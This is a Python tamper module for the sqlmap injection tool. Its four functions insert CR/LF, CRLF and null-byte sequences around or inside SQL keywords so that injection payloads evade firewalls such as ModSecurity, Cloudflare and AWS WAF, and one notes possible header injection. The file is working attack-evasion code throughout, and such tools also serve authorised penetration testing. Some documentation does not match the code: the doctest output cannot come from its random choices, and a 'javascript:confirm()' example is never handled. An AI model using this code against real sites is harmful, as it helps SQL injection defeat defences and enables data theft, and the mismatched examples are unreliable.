#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random
import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Uses line breaks (CR/LF) to break WAF regex patterns

    Requirement:
        * MySQL, PostgreSQL, MSSQL

    Tested against:
        * ModSecurity CRS
        * Cloudflare WAF
        * AWS WAF
        * Regex-based WAFs

    Notes:
        * A lot of WAFs with regex-based filtering effectively block many attempts
        * Line breaks technique (CR and LF) can break firewall regex and bypass stuff
        * CR = %0D (Carriage Return)
        * LF = %0A (Line Feed)
        * CRLF = %0D%0A

    Reference:
        * https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/

    >>> tamper('1 UNION SELECT 1,2,3')
    '1 %0AUNION%0D%0ASELECT %0A1,2,3'
    """

    if not payload:
        return payload

    retVal = payload
    
    # Line break variants
    line_breaks = [
        "%0A",      # LF (Line Feed)
        "%0D",      # CR (Carriage Return)
        "%0D%0A",   # CRLF
        "%0A%0D",   # LFCR
        "%0A%0A",   # Double LF
        "%0D%0D",   # Double CR
    ]
    
    # SQL keywords to wrap with line breaks
    keywords = [
        "SELECT", "UNION", "FROM", "WHERE", "AND", "OR",
        "INSERT", "UPDATE", "DELETE", "ORDER", "GROUP",
        "HAVING", "LIMIT", "JOIN", "NULL", "INTO"
    ]
    
    for keyword in keywords:
        pattern = re.compile(r'\b(%s)\b' % keyword, re.IGNORECASE)
        
        def add_linebreak(match):
            word = match.group(1)
            lb = random.choice(line_breaks)
            # Add line break before keyword
            return "%s%s" % (lb, word)
        
        retVal = pattern.sub(add_linebreak, retVal)
    
    return retVal


def tamper_between_chars(payload, **kwargs):
    """
    Inserts line breaks between characters of SQL keywords
    More aggressive version that splits keywords character by character
    
    Example: javascript:confirm() -> j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:confirm()
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]
    
    for keyword in keywords:
        pattern = re.compile(r'\b(%s)\b' % keyword, re.IGNORECASE)
        
        def split_with_linebreaks(match):
            word = match.group(1)
            result = ""
            for i, char in enumerate(word):
                result += "%0A" + char if i > 0 else char
            return result
        
        retVal = pattern.sub(split_with_linebreaks, retVal)
    
    return retVal


def tamper_crlf_injection(payload, **kwargs):
    """
    Uses CRLF sequences that may also enable header injection
    in vulnerable applications
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Replace spaces with CRLF sequences
    retVal = re.sub(r'\s+', '%0D%0A', retVal)
    
    return retVal


def tamper_null_crlf(payload, **kwargs):
    """
    Combines null bytes with CRLF for additional obfuscation
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Patterns combining null and CRLF
    null_crlf_patterns = [
        "%00%0A",
        "%00%0D",
        "%0A%00",
        "%0D%00",
    ]
    
    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]
    
    for keyword in keywords:
        pattern = re.compile(r'\b(%s)\b' % keyword, re.IGNORECASE)
        
        def add_null_crlf(match):
            word = match.group(1)
            nc = random.choice(null_crlf_patterns)
            return "%s%s" % (nc, word)
        
        retVal = pattern.sub(add_null_crlf, retVal)
    
    return retVal
